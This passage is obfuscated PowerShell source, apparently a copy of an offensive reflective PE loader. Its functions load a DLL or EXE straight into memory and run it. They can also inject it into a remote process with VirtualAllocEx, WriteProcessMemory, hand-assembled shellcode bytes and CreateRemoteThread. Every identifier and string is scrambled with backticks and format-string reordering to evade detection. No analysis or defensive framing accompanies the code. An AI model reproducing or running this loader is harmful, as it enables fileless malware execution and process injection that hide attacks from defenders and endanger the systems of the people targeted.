				${Fun`COff`S`et} =  ${JK5`MBH}::"P`TrT`oStrU`c`TurE"(${fU`NCOf`FsE`TaDdR}, [Type][UInt32])
				return &("{5}{4}{1}{3}{0}{2}{6}"-f 's','t','U','A','In','Add-Signed','nsigned') (${p`EH`Andle}) (${f`U`N`cOFFseT})
			}
		}
		
		return  ( get-ITeM ("{0}{2}{3}{1}" -f 'VAri','D','AblE:','Jp7')  )."v`ALuE"::"ZE`Ro"
	}


	Function INVOk`e-`meMoRyLoADLIb`R`ArY
	{
		Param(
		[Parameter( pOsiTIoN = 0, mandaToRy = ${tr`Ue} )]
		[Byte[]]
		${PE`ByTes},
		
		[Parameter(pOSiTIon = 1, MandatoRY = ${F`AlsE})]
		[String]
		${ExeA`R`gs},
		
		[Parameter(pOsitIOn = 2, maNdAToRy = ${f`A`LsE})]
		[IntPtr]
		${rem`Ot`EpR`Och`AnDlE}
		)
		
		${p`T`RSizE} =   ${Jk5`m`Bh}::"Siz`e`OF"([Type][IntPtr])
		
		${win`32co`NsTAn`TS} = &("{3}{0}{2}{1}"-f 'et','32Constants','-Win','G')
		${W`in32`FU`NCt`iONS} = &("{1}{2}{0}{3}" -f 'ct','Get-W','in32Fun','ions')
		${WIN32ty`p`eS} = &("{2}{1}{0}" -f 'ypes','-Win32T','Get')
		
		${Rem`oTe`loA`DIng} = ${fa`L`Se}
		if ((${r`EmOte`PrOC`HAn`dLe} -ne ${n`ULL}) -and (${r`EMOTE`prOc`HANdLE} -ne   ( iteM  ("{0}{2}{1}"-f'vAria','e:Jp7d','bL')  )."VA`Lue"::"Z`erO"))
		{
			${REMO`Te`lOadI`NG} = ${TR`Ue}
		}
		
		&("{4}{3}{0}{2}{1}" -f'ite','rbose','-Ve','r','W') ("{1}{6}{4}{0}{9}{2}{3}{5}{7}{8}{10}" -f'ng basic','G','E informati','o','ti','n from th','et','e ','fi',' P','le')
		${Pe`in`FO} = &("{0}{1}{3}{4}{2}" -f 'Get-P','E','fo','Basic','In') -PEBytes ${p`E`ByTEs} -Win32Types ${wiN32Ty`P`Es}
		${o`RI`GiNaLi`MaGEBa`SE} = ${P`e`INFO}."ORigIN`ALiM`A`GEbA`sE"
		${Nx`coMp`AT`IBlE} = ${tR`UE}
		if (([Int] ${P`E`INfo}."dLLC`hAr`ACTE`RI`ST`ICs" -band ${Wi`N32C`oNsTAnts}."I`mAgE_dL`lC`h`ArAC`TE`RISt`ICs`_`NX_cOMPAT") -ne ${WiN32CON`St`AN`Ts}."ImAge_dL`lcharACT`eriS`Ti`cs`_NX`_COmpAt")
		{
			&("{0}{2}{3}{1}"-f 'Wr','arning','ite-','W') ("{2}{3}{4}{9}{5}{8}{6}{0}{1}{7}"-f ' i','ssue','PE is not co','mp','ati','h DEP, mi',' cause','s','ght','ble wit') -WarningAction ("{1}{0}"-f 'ue','Contin')
			${n`xcO`mpat`iblE} = ${Fa`Lse}
		}
		
		
		${PrO`Ce`SS64`B`It} = ${tr`Ue}
		if (${R`EmOT`elOADI`Ng} -eq ${TR`Ue})
		{
			${KER`NE`L3`2hAN`Dle} = ${Win32funCT`io`NS}."GetMod`ULE`hANd`LE"."invO`Ke"(("{3}{0}{1}{2}" -f'nel32.','d','ll','ker'))
			${rEs`Ult} = ${WI`N3`2FunctiOns}."geT`pRO`caDdR`E`sS"."inv`oke"(${K`ErN`EL32Ha`ND`LE}, ("{0}{1}{2}{3}" -f'IsWow64Pr','o','ce','ss'))
			if (${re`Sult} -eq   ${JP`7D}::"Z`eRo")
			{
				Throw ((("{1}{13}{11}{19}{18}{8}{7}{9}{0}{6}{17}{20}{4}{10}{3}{15}{14}{5}{2}{12}{16}"-f 'function to de','C',' or ','process i','if','t','term','s','es',' ',' target ',' ','6','ouldnUAHt locate',' 32bi','s','4bit','in','ow64Proc','IsW','e '))."rEPL`ACe"('UAH',[stRiNg][chAr]39))
			}
			
			[Bool]${WoW6`4PR`OceSS} = ${f`Al`SE}
			${sUcCe`Ss} = ${win32Fu`N`ct`i`ons}."ISW`OW64PRoc`ess"."iNvO`kE"(${reMOTE`p`RO`Cha`N`dlE}, [Ref]${W`oW64prOC`ESs})
			if (${suCc`e`Ss} -eq ${FA`lse})
			{
				Throw ("{2}{0}{3}{1}{5}{4}{6}" -f'll to ','ow64Pr','Ca','IsW','fail','ocess ','ed')
			}
			
			if ((${W`oW64PRocE`ss} -eq ${Tr`Ue}) -or ((${WoW64`Pr`O`cess} -eq ${FAl`se}) -and ( (  geT-IteM ("{0}{3}{1}{2}" -f 'V','E:Jk','5Mbh','ariABl') )."vAL`Ue"::"si`zEoF"([Type][IntPtr]) -eq 4)))
			{
				${Pr`o`c`esS64bIT} = ${FA`LSE}
			}
			
			${PoW`ershElL`64`BiT} = ${Tr`Ue}
			if (  ( GEt-ItEm  ('V'+'Ari'+'A'+'Ble:jk5M'+'bh'))."vA`LuE"::"SIz`e`OF"([Type][IntPtr]) -ne 8)
			{
				${PowEr`She`ll64BIt} = ${f`AlSe}
			}
			if (${pO`WEr`sH`ell6`4BIT} -ne ${pRO`c`ES`S64BIt})
			{
				throw (("{11}{13}{21}{4}{7}{17}{16}{3}{5}{20}{23}{24}{6}{2}{18}{1}{10}{15}{19}{9}{14}{0}{22}{8}{12}" -f 'emo','E bein',') ','be','hell',' same','86/x64',' m','proces',' ','g','Powe','s','r','and r',' loade','st ','u','as P','d',' archit','S','te ','ecture (','x'))
			}
		}
		else
		{
			if (  ${j`K`5mBH}::"siz`E`OF"([Type][IntPtr]) -ne 8)
			{
				${proCES`S64`B`it} = ${FA`lSE}
			}
		}
		if (${proC`e`sS64B`it} -ne ${pe`InfO}."pE`64bit")
		{
			Throw ((("{8}{15}{4}{5}{3}{7}{14}{16}{1}{6}{0}{12}{2}{13}{10}{11}{9}" -f ' be','c','loaded ','match the','m doesnvfA','t ','ture of the process it is',' a','PE platf','it)','32/','64b','ing ','in (','rc','or','hite'))  -cRePLAcE ([CHAR]118+[CHAR]102+[CHAR]65),[CHAR]39)
		}
		

		&("{3}{2}{1}{0}" -f 'e','os','te-Verb','Wri') ("{5}{1}{11}{16}{13}{14}{4}{9}{7}{10}{17}{2}{3}{15}{12}{6}{0}{8}" -f 'o me','llocating ','ts ','hea','e','A','s t','E an','mory',' P','d wr','mem','er','for ','th','d','ory ','ite i')
		
		[IntPtr]${l`oA`DAD`dr} =   ( GeT-vAriaBLe  ("{1}{0}" -f'p7D','j')  -VA  )::"ZE`Ro"
		if (([Int] ${PE`i`NFo}."dll`c`harAC`TE`Risti`cs" -band ${Win`32c`OnstaNTS}."imag`e_DLl`ch`A`RA`CteriSTicS_dynaMic_`BAsE") -ne ${W`In32cO`N`STAntS}."imAg`e`_dLlChAr`AcTe`Rist`i`C`s`_D`yNAMIC_baSE")
		{
			&("{0}{2}{1}"-f'Writ','ng','e-Warni') ("{12}{9}{10}{3}{1}{17}{23}{14}{18}{13}{30}{16}{26}{2}{19}{8}{27}{28}{24}{29}{7}{25}{5}{0}{11}{21}{32}{15}{6}{20}{31}{4}{22}" -f 'ti','g refle','com','in','i','r','ll a','ls, try ','. ','e',' be','ng','PE fil','ded is','ly lo','She','S','ctiv','a','patible','nd ',' Powe','ng again','e',' ','resta','LR ','I','f','the loading fai',' not A','try','r') -WarningAction ("{2}{1}{0}" -f'ue','ntin','Co')
			[IntPtr]${L`oA`Dad`dr} = ${OrIgI`NAliMAGe`B`ASE}
		}

		${pEh`A`N`dLe} =   (  ChildiTEm  ("{1}{0}{2}"-f 'IAbLe:jP','vaR','7d') )."va`LUE"::"Z`ErO"				
		${EFFEc`TI`Vepe`HAndLe} =   (gcI  ("V"+"ariAB"+"Le:J"+"P7d"))."Val`Ue"::"Ze`RO"		
		if (${rEMo`TElO`ADiNG} -eq ${t`Rue})
		{
			${p`ehandLE} = ${w`In32FUnc`T`Io`NS}."vIRTuA`LAl`lOC"."i`NVokE"( (  GeT-VArIABle  ('JP'+'7D')  -VA)::"z`erO", [UIntPtr]${p`einFo}."sIz`E`oF`ImAGe", ${WIN32`c`on`StAN`TS}."MEm_cO`m`miT" -bor ${W`iN`32coNs`TANTs}."MEM`_res`Er`Ve", ${w`in3`2coN`stANtS}."p`AgE`_r`EadWriTe")
			
			${Ef`F`ec`TiV`EPEhAndle} = ${w`In3`2fUNCTIo`NS}."vi`RT`UA`LAL`LoCEX"."i`NvoKE"(${R`EMoTEproCh`A`NDle}, ${loAd`AD`dr}, [UIntPtr]${PE`IN`Fo}."S`ize`ofI`magE", ${WIn`32`coNsta`Nts}."MeM_`cOM`miT" -bor ${w`in3`2`cOn`STantS}."MEm_re`SE`RvE", ${w`In32`ConST`A`Nts}."pAgE`_`Exe`cUtE_R`EAdWRiTE")
			if (${EfF`eC`T`iv`ePE`HAndLE} -eq  (  DIR ('VARiA'+'Ble'+':JP'+'7d'))."vA`LUe"::"Ze`Ro")
			{
				Throw ((("{38}{5}{32}{43}{22}{18}{34}{6}{12}{26}{1}{3}{0}{42}{31}{36}{41}{25}{37}{17}{14}{21}{40}{15}{44}{23}{33}{24}{11}{30}{27}{10}{4}{7}{9}{45}{19}{13}{20}{28}{16}{39}{8}{35}{2}{29}" -f'being',' If the ','y i','PE ','a','to','e re','se','re',' addres','ed b','tha','mo','e PE',' ','t ASLR','s','7PYt','n ','th',' ','s',' i',' it c','be ','s','te process.','quest','i','n use','t the re','ade',' allocate mem','ould ','th','ad','d ','n','Unable ',' al','uppor','doe',' lo','ory',',','s of '))."r`ep`LAcE"('7PY',[StRIng][ChaR]39))
			}
		}
		else
		{
			if (${n`xCOmpA`TIBle} -eq ${TR`Ue})
			{
				${pE`Hand`le} = ${wIN`3`2`FU`NctiOnS}."ViRt`Ual`AllOC"."INV`OKe"(${L`o`A`Daddr}, [UIntPtr]${pEIn`Fo}."si`Z`EoFImAge", ${WiN32Co`N`STa`NtS}."M`em_c`OmMIt" -bor ${W`in32c`ONST`A`Nts}."ME`m_res`e`RVe", ${WI`N3`2C`on`STanTS}."pA`g`e_REa`Dwr`ITe")
			}
			else
			{
				${P`eHA`NDLe} = ${Wi`N32`Funct`i`onS}."vIr`TUa`LA`LLOc"."iNVO`KE"(${lo`AdAd`dr}, [UIntPtr]${p`e`InFO}."Si`ZEO`FiMAGE", ${WIN32`Co`NSt`AnTs}."MeM`_CO`mmIt" -bor ${WI`N`32cONsTA`Nts}."ME`M_R`e`SeRVe", ${WiN32C`oNs`Ta`NTs}."PaG`E_e`Xec`UTe`_reADWRI`TE")
			}
			${eff`E`CtiV`EPeHaNd`LE} = ${p`Eh`ANDlE}
		}
		
		[IntPtr]${p`EEndAd`d`ResS} = &("{0}{4}{1}{2}{3}" -f'Add-SignedIntA','Uns','i','gned','s') (${PeH`ANdLe}) ([Int64]${P`ei`NFo}."sIZeOfI`Ma`gE")
		if (${Pe`HAn`DlE} -eq  ( vARiabLe  ("{0}{1}" -f'Jp','7d') )."Va`lUe"::"z`ERO")
		{ 
			Throw (("{0}{34}{26}{41}{32}{29}{21}{2}{33}{16}{39}{38}{14}{7}{11}{42}{8}{20}{30}{25}{9}{3}{36}{10}{13}{18}{4}{6}{37}{5}{23}{1}{19}{24}{40}{15}{28}{31}{22}{35}{17}{27}{12}"-f'VirtualAlloc fail','diff',' me','werShell process ','l','ve ','l ','atible, try running ','t in',' Po','e new Power','the ','.','Shell proces','not ASLR comp','ory la',' I','e','s wi','er',' a n','e','re','a ','en','w',' a',')','yout, so the ad','cat','e','d','o','mory for PE.','ed to','ss the PE wants might be fre','(th','ha','is ','f PE ','t mem','ll','scrip'))
		}		
		 ( gET-cHIlDitem ('V'+'ArIAble'+':J'+'K5MB'+'h')  )."VAL`Ue"::("{1}{0}"-f'y','Cop').Invoke(${P`eByT`ES}, 0, ${PEha`N`Dle}, ${p`Ei`Nfo}."SIZEoF`heA`d`Ers") | &("{2}{1}{0}"-f 'l','l','Out-Nu')
		
		
		&("{0}{1}{2}{3}"-f'Wr','ite-','Ver','bose') ("{2}{9}{14}{12}{4}{15}{13}{8}{1}{5}{16}{7}{3}{10}{0}{6}{11}"-f 'rs loade','n','Getting de','the ',' info',' fr','d i','m ','o','t','heade','n memory','PE','ti','ailed ','rma','o')
		${Pei`Nfo} = &("{0}{1}{3}{4}{2}" -f'Get','-P','dInfo','EDe','taile') -PEHandle ${p`ehA`NDle} -Win32Types ${Wi`N`32T`Ypes} -Win32Constants ${WiN3`2`cON`STaN`Ts}
		${pe`iN`Fo} | &("{1}{2}{0}"-f'r','Add-Memb','e') -MemberType ("{0}{1}{2}" -f'Not','eP','roperty') -Name ("{1}{0}{2}" -f 'ndAddre','E','ss') -Value ${p`EENda`ddRESs}
		${P`EiNFo} | &("{2}{0}{1}" -f'd-','Member','Ad') -MemberType ("{0}{3}{1}{2}" -f'Note','ert','y','Prop') -Name ("{2}{1}{3}{0}"-f'ndle','ffectivePE','E','Ha') -Value ${EF`FecTIVEpE`HA`NDLe}
		&("{3}{0}{2}{1}{4}" -f 'it','-Ve','e','Wr','rbose') ('StartAddr'+'es'+'s'+': '+"$PEHandle "+' '+' '+' '+'En'+'d'+'Addres'+'s: '+"$PEEndAddress")
		
		
		&("{3}{1}{0}{4}{2}"-f'e-Verb','t','se','Wri','o') ("{1}{5}{6}{4}{0}{3}{2}"-f'i','Co','o memory','n t',' sections ','py P','E')
		&("{1}{4}{3}{2}{0}"-f 's','C','on','i','opy-Sect') -PEBytes ${pebY`T`ES} -PEInfo ${pE`iNfo} -Win32Functions ${wIn`32FU`Nc`T`iONS} -Win32Types ${WiN`3`2`TypEs}
		
		
		&("{0}{2}{1}{3}" -f'Wri','-Ver','te','bose') ("{17}{12}{13}{8}{10}{1}{11}{9}{2}{16}{0}{7}{3}{14}{15}{4}{5}{6}" -f'was ac','d','PE','al','d in',' memor','y','tu','se',' where the ','s base',' on','pdate memory ','addres','ly ','loade',' ','U')
		&("{0}{2}{4}{6}{3}{1}{5}"-f'Up','se','date-Memory','s','A','s','ddre') -PEInfo ${pe`I`NFO} -OriginalImageBase ${O`RiG`InA`L`iM`AGebAse} -Win32Constants ${win32`cONstan`Ts} -Win32Types ${W`I`N32Ty`pes}

		
		&("{3}{0}{1}{2}" -f 'e-','V','erbose','Writ') ((("{1}{4}{2}{0}{7}{9}{5}{8}{10}{6}{3}" -f 'eded by','I','ort DLL{0}s ne','oading','mp',' a',' l',' ','r','the PE we','e'))  -f  [ChAR]39)
		if (${REmOTeLo`A`D`ing} -eq ${T`RuE})
		{
			&("{4}{3}{1}{2}{0}" -f 'ports','I','m','port-Dll','Im') -PEInfo ${p`eINfo} -Win32Functions ${wi`N`32FU`NcT`IOnS} -Win32Types ${WIN32`T`Y`Pes} -Win32Constants ${W`I`N`32cO`NStanTs} -RemoteProcHandle ${rE`moTEPr`Och`AndLE}
		}
		else
		{
			&("{2}{3}{1}{0}"-f'ts','or','Import-DllI','mp') -PEInfo ${PEi`NFo} -Win32Functions ${wi`N`32FuNcti`OnS} -Win32Types ${WIn32`TyP`ES} -Win32Constants ${Wi`N32C`ONSta`NTs}
		}
		
		
		if (${re`MO`TE`Lo`Ading} -eq ${FA`lsE})
		{
			if (${Nx`c`Om`PaTibLe} -eq ${t`RuE})
			{
				&("{3}{2}{0}{1}" -f'Ve','rbose','te-','Wri') ("{4}{1}{5}{6}{3}{2}{0}" -f's','mor',' flag','on','Update me','y protec','ti')
				&("{1}{3}{5}{0}{6}{2}{4}"-f '-Memo','Upd','onFla','at','gs','e','ryProtecti') -PEInfo ${PEiN`FO} -Win32Functions ${w`IN32`Fu`Nc`TiOnS} -Win32Constants ${W`IN3`2`COnSt`ANtS} -Win32Types ${WIN3`2`TypEs}
			}
			else
			{
				&("{1}{2}{0}" -f 'ose','Writ','e-Verb') ("{8}{17}{6}{1}{18}{15}{7}{13}{11}{3}{9}{0}{19}{14}{5}{16}{2}{4}{12}{10}"-f 'i','efl',' memory as r','s not compa','ea','in','ng r','ly ','PE b','t','ute','oaded i','d write exec','l',' with NX memory, keep','e','g','ei','ectiv','ble')
			}
		}
		else
		{
			&("{2}{1}{0}"-f 'se','Verbo','Write-') ("{16}{9}{3}{6}{10}{2}{12}{0}{15}{4}{14}{11}{8}{1}{5}{7}{13}"-f 'oces','m','te ','n',', not ad','ory p','g lo','ermiss','me','E bei','aded in to a remo','ing ','pr','ions','just','s','P')
		}
		
		
		if (${r`eMot`ELOA`d`Ing} -eq ${t`RuE})
		{
			[UInt32]${nU`mBYtESwri`Tt`en} = 0
			${Su`cCe`ss} = ${WIn`32`FU`NCTiO`NS}."w`RiT`ePrOc`eSSMemo`Ry"."iNvO`ke"(${r`EMO`Te`PRoCHA`N`dle}, ${effec`TIVepeH`An`d`le}, ${pe`h`AndlE}, [UIntPtr](${PEIN`FO}."s`iZe`oF`IMage"), [Ref]${numB`YteS`wR`iT`TEN})
			if (${S`UCCE`ss} -eq ${f`AL`sE})
			{
				Throw ("{5}{4}{0}{2}{3}{1}{8}{6}{7}"-f'lcode ','e proc','to',' remot','hel','Unable to write s','emory','.','ess m')
			}
		}
		
		
		if (${pei`Nfo}."fi`l`etYPe" -ieq "DLL")
		{
			if (${REmoTE`lo`Adi`NG} -eq ${fA`L`SE})
			{
				&("{0}{1}{2}"-f 'Wr','ite','-Verbose') ("{7}{6}{3}{8}{9}{14}{12}{10}{0}{11}{5}{1}{13}{2}{15}{4}" -f 'it has',' ','o','i','ed','en','l','Cal','ng ','dllmain ','s ',' be','L know','l','so the DL','ad')
				${dLl`ma`In`PtR} = &("{4}{3}{2}{5}{1}{0}"-f'signed','AsUn','n','gnedI','Add-Si','t') (${PE`in`Fo}."pehanD`le") (${Pe`IN`Fo}."iMAG`e_N`T_HEADerS"."O`P`TIONA`lhEAD`eR"."address`oFe`Ntr`y`PO`i`NT")
				${D`lLmaiN`DE`Le`gATe} = &("{1}{3}{0}{4}{2}"-f'e','Get','eType','-D','legat') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${DLL`M`AIn} =   ${J`k5`MBH}::("{1}{6}{2}{5}{0}{4}{3}" -f'cti','GetDel','teForF','ointer','onP','un','ega').Invoke(${dl`lm`A`iNPTr}, ${d`llM`AINDele`gA`TE})
				
				${dLlMa`in}."INv`OkE"(${P`EiNFO}."pE`h`AnDle", 1,   (geT-ChIldIteM  ('VAr'+'IAbl'+'e:Jp7'+'D'))."vA`LUE"::"ZE`RO") | &("{1}{0}{2}" -f'u','Out-N','ll')
			}
			else
			{
				${DL`lM`AIn`Ptr} = &("{4}{1}{3}{6}{0}{2}{5}" -f'sig','S','n','ignedIntA','Add-','ed','sUn') (${e`FFec`TiVepEH`A`Nd`le}) (${pe`In`FO}."I`m`Age`_nt_HEa`ders"."oPT`IonaLh`EAdeR"."addr`es`s`of`entRYpOiNT")
			
				if (${P`eiNFo}."pE`64BIT" -eq ${t`RuE})
				{
					${CA`Ll`DllM`AinS`C1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${calLD`LLMai`N`Sc2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${C`A`lld`lLMaIns`c3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${cAl`ld`LlmA`inSc1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${CALLDlL`m`AIn`s`C2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${C`ALLd`LLMAI`NSC3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${sCleN`g`TH} = ${caLLd`L`L`MAi`Nsc1}."leng`TH" + ${c`Al`l`dLlmaINsC2}."l`EnGTh" + ${cal`ld`LlMa`I`NSC3}."L`EnGtH" + (${Pt`RS`Ize} * 2)
				${SC`p`sMeM} =   (VarIablE ('JK5mB'+'h')  )."V`Alue"::("{2}{3}{0}{1}"-f 'lob','al','Al','locHG').Invoke(${SCLE`Ng`TH})
				${SCP`sMemOrIGin`AL} = ${s`c`PsMEM}
				
				&("{4}{1}{3}{0}{2}{5}"-f 'e','ite-BytesTo','mo','M','Wr','ry') -Bytes ${Call`D`ll`MaINsc1} -MemoryAddress ${sC`psM`EM}
				${sCPsm`em} = &("{4}{1}{3}{2}{5}{0}{6}"-f'Un','d-S','dIn','igne','Ad','tAs','signed') ${sC`pS`meM} (${Ca`LLDlL`MAI`NS`C1}."len`gTH")
				 ( Gci ("{0}{3}{1}{2}"-f'VariAblE:jk','M','BH','5'))."va`luE"::("{2}{0}{1}" -f'tructureT','oPtr','S').Invoke(${ef`FeCT`IvEPEHANd`lE}, ${sc`pSMEM}, ${f`A`Lse})
				${SCps`mem} = &("{7}{2}{0}{3}{4}{6}{5}{1}"-f 'd','ned','d','-Si','gnedIn','g','tAsUnsi','A') ${SCpS`M`em} (${pTrsI`ZE})
				&("{0}{2}{3}{1}" -f 'Write-','Memory','Byte','sTo') -Bytes ${c`AL`lDlLmAiNs`c2} -MemoryAddress ${SC`Ps`mEM}
				${sc`Ps`MeM} = &("{6}{5}{0}{2}{3}{1}{4}"-f'd-Signe','gne','dIn','tAsUnsi','d','d','A') ${sCpS`m`EM} (${c`ALLdL`lmai`N`SC2}."lEN`G`Th")
				 ( GET-vaRiaBle ("j"+"k5MBh")  )."v`AlUE"::("{2}{0}{3}{1}{4}" -f't','reToP','Struc','u','tr').Invoke(${dllma`i`N`Ptr}, ${s`c`PsMeM}, ${fAL`sE})
				${Sc`pSMem} = &("{4}{3}{0}{5}{2}{1}" -f 'gned','ed','sUnsign','d-Si','Ad','IntA') ${ScPs`m`em} (${P`Tr`SizE})
				&("{0}{2}{3}{1}" -f'Write-','emory','BytesTo','M') -Bytes ${CAl`lD`LlmAins`C3} -MemoryAddress ${Sc`PsmEm}
				${S`cp`sMEM} = &("{1}{0}{2}{4}{3}{6}{5}" -f 'i','Add-S','gn','nt','edI','nsigned','AsU') ${ScpS`m`Em} (${C`ALLDL`lmain`sc3}."LE`NgTH")
				
				${rScA`D`Dr} = ${wI`N32f`UNC`TI`oNS}."virt`U`ALALL`oCEx"."I`NVOKE"(${rEM`OTEPR`O`cHa`NDLe},  ${j`p7D}::"Z`ERo", [UIntPtr][UInt64]${SclE`N`Gth}, ${Wi`N3`2cONsTanTS}."mem_c`O`mmit" -bor ${wI`N32c`OnS`Ta`NtS}."mem_R`esER`Ve", ${WI`N3`2COnstants}."pAgE_e`X`ECUTe`_`R`eadW`RItE")
				if (${rS`ca`DDR} -eq  ${jP`7d}::"Z`eRo")
				{
					Throw ("{7}{6}{8}{10}{3}{0}{9}{5}{1}{2}{4}" -f'remote proce','or shel','lc','he ','ode',' f','nable to','U',' allocate memory','ss',' in t')
				}
				
				${S`UcC`Ess} = ${W`In`32fUNcT`I`oNS}."writEpro`ce`SSm`e`m`OrY"."I`NvokE"(${RE`MOt`e`p`Rochan`Dle}, ${rS`C`ADDr}, ${scPSme`MoRi`g`INAl}, [UIntPtr][UInt64]${S`cL`enGTH}, [Ref]${nu`mbyT`ESwR`iT`Ten})
				if ((${sUC`CEsS} -eq ${f`Alse}) -or ([UInt64]${N`UMBYtES`WR`It`Ten} -ne [UInt64]${SC`le`N`gTh}))
				{
					Throw ("{10}{8}{3}{4}{12}{2}{6}{1}{11}{5}{0}{7}{13}{9}" -f 'process ','lcod','e','to wri','te','mote ','l','me','able ','ry.','Un','e to re',' sh','mo')
				}

				${rTh`R`eAD`HaNDLE} = &("{7}{1}{0}{3}{4}{6}{5}{2}"-f'-','oke','read','CreateRemo','te','h','T','Inv') -ProcessHandle ${rem`otE`prOCH`ANd`Le} -StartAddress ${r`SCad`DR} -Win32Functions ${WIN`32FU`NCtIons}
				${RE`Su`lt} = ${wiN3`2F`UNC`TIonS}."w`AI`Tf`o`RsiNgleobJect"."INV`OKe"(${RtHr`Ead`HaN`dLE}, 20000)
				if (${re`Su`lT} -ne 0)
				{
					Throw ("{14}{13}{9}{5}{2}{3}{8}{6}{1}{0}{7}{10}{4}{12}{11}"-f'Proc','t','Rem','oteThread t','ss ','to Create',' call Ge','A','o','l ','ddre','d.','faile','l','Ca')
				}
				
				${wiN`32fun`cTiO`NS}."vI`RTU`AlFrE`eEX"."Invo`KE"(${remO`Te`PRO`cHAnDLE}, ${RS`c`AdDr}, [UIntPtr][UInt64]0, ${wIn3`2co`NSTan`Ts}."mE`M`_rEleAsE") | &("{1}{0}{2}"-f'ut-Nu','O','ll')
			}
		}
		elseif (${pEi`NfO}."f`I`lETYPe" -ieq "EXE")
		{
			[IntPtr]${exedO`N`eBy`TEptR} =  ${jK5`M`Bh}::("{0}{3}{2}{1}"-f'Alloc','l','loba','HG').Invoke(1)
			  ( VaRiABle ('j'+'k5Mbh') -vaLu)::("{1}{2}{0}" -f'Byte','Wr','ite').Invoke(${eXED`OnE`B`YtEPTR}, 0, 0x00)
			${o`VerwRiT`Te`NmE`MI`NFO} = &("{4}{0}{2}{1}{3}" -f 'e','xeFuncti','-E','ons','Updat') -PEInfo ${PEin`FO} -Win32Functions ${wIn`32fUNCtI`ons} -Win32Constants ${W`iN3`2COnsT`ANts} -ExeArguments ${exe`A`Rgs} -ExeDoneBytePtr ${e`X`e`DO`NEBytEptR}

			[IntPtr]${eX`EMa`INPtR} = &("{2}{3}{4}{1}{0}" -f'd','sUnsigne','A','d','d-SignedIntA') (${peI`NfO}."pEh`AN`dle") (${pei`N`FO}."I`Mage_`Nt_H`e`AderS"."oPTIO`N`AlHe`AdEr"."adD`R`eSS`O`FentrypoINt")
			&("{2}{0}{4}{3}{1}" -f'r','se','W','-Verbo','ite') ('C'+'all '+'E'+'XE '+'Main'+' '+'f'+'uncti'+'on'+'. '+'Addr'+'es'+'s: '+"$ExeMainPtr. "+'C'+'reatin'+'g '+'th'+'rea'+'d '+'for'+' '+'t'+'he '+'EX'+'E '+'to'+' '+'run'+' '+'in'+'.')

			${WIN32`FUn`CTi`O`Ns}."cR`EAtE`Th`REad"."inv`Oke"( (  lS ('VA'+'rIa'+'blE:j'+'P7d') )."vA`luE"::"zE`RO",   (  gET-vaRiAbLE ('J'+'p7D')  -VAluEONl  )::"ze`RO", ${EX`E`mAINP`Tr},  (  variABLe ('J'+'p7D'))."VA`LuE"::"z`ero", ([UInt32]0), [Ref]([UInt32]0)) | &("{1}{0}{2}" -f't-','Ou','Null')

			while(${tR`Ue})
			{
				[Byte]${T`Hr`EA`DDonE} =   ( VARiAble  ('j'+'k5M'+'Bh') )."va`LUe"::("{2}{1}{0}" -f'te','dBy','Rea').Invoke(${exEDonEb`YT`E`pTR}, 0)
				if (${t`hRE`AdD`oNE} -eq 1)
				{
					&("{1}{2}{3}{0}{4}"-f'm','Copy-Arra','yO','fMe','Addresses') -CopyInfo ${ovEr`W`R`ITte`NMEMI`Nfo} -Win32Functions ${wIN`32fUN`c`T`iOns} -Win32Constants ${w`I`N3`2cO`NstAntS}
					&("{1}{2}{0}{3}{4}"-f '-Ve','Wr','ite','rbos','e') ("{1}{5}{3}{0}{4}{2}" -f'ple','E','d.','read has com','te','XE th')
					break
				}
				else
				{
					&("{1}{0}{2}" -f't-','Star','Sleep') -Seconds 1
				}
			}
		}
		
		return @(${PEI`NFO}."P`EH`ANDLe", ${Ef`F`ec`TiVEpEH`ANd`Le})
	}
	
	
	Function in`Vok`e-me`MO`RYfree`li`BRaRY
	{
		Param(
		[Parameter(posITion=0, MaNdaTOry=${t`RUe})]
		[IntPtr]
		${pEhA`N`Dle}
		)
		
		${w`in32c`oN`STAnTs} = &("{0}{3}{2}{4}{1}" -f 'Ge','ts','in32Cons','t-W','tan')
		${WIn`32`FUNCTi`oNS} = &("{1}{4}{3}{0}{2}"-f'ncti','Get','ons','Fu','-Win32')
		${W`IN3`2TY`PEs} = &("{1}{2}{0}" -f 'in32Types','G','et-W')
		
		${PeIn`FO} = &("{2}{3}{1}{0}{4}" -f 'EDetailed','P','Get','-','Info') -PEHandle ${pe`HA`NDLE} -Win32Types ${w`In`32TYPES} -Win32Constants ${wI`N32c`ONsT`AnTs}
		
		if (${p`eIn`FO}."iM`AGe_`Nt_`heAdE`Rs"."oP`Ti`OnaL`headeR"."iMP`oRt`TA`BlE"."s`IZE" -gt 0)
		{
			[IntPtr]${iM`POr`T`de`ScripT`OrPTr} = &("{2}{5}{3}{4}{0}{1}" -f'nt','AsUnsigned','Ad','-Sig','nedI','d') ([Int64]${PE`i`Nfo}."pE`HAn`dlE") ([Int64]${PE`infO}."ImaG`e_`Nt_`hEAdERS"."optIOn`A`lH`EaDEr"."I`mPO`RTtabLe"."vIR`T`UalAd`DR`eSs")
			
			while (${T`Rue})
			{
				${IMPoRt`Des`cRiPt`oR} =   ${jK`5MBH}::"ptRto`stru`c`TurE"(${im`P`ORTDEsCriptO`RpTr}, [Type]${win32t`Y`PEs}."Ima`G`e_iMp`or`T_`DEScRiPToR")
				
				if (${IMPO`R`T`DeScRIpTOR}."chARa`cTe`RiSTIcs" -eq 0 `
						-and ${IMp`o`RTd`ESCrI`P`TOR}."fiR`S`T`THuNk" -eq 0 `
						-and ${im`pOrTDe`SC`RI`pt`or}."fORWAr`Der`Ch`Ain" -eq 0 `
						-and ${I`mPOrtd`ES`CrIp`ToR}."n`Ame" -eq 0 `
						-and ${ImPo`R`TdeScr`ipTOR}."TIm`EDaTeSta`MP" -eq 0)
				{
					&("{3}{1}{4}{0}{2}" -f'os','e','e','Writ','-Verb') ("{2}{6}{7}{3}{4}{5}{0}{1}{8}" -f 'g the l','ibraries needed ','Do','o','adi','n','ne ','unl','by the PE')
					break
				}
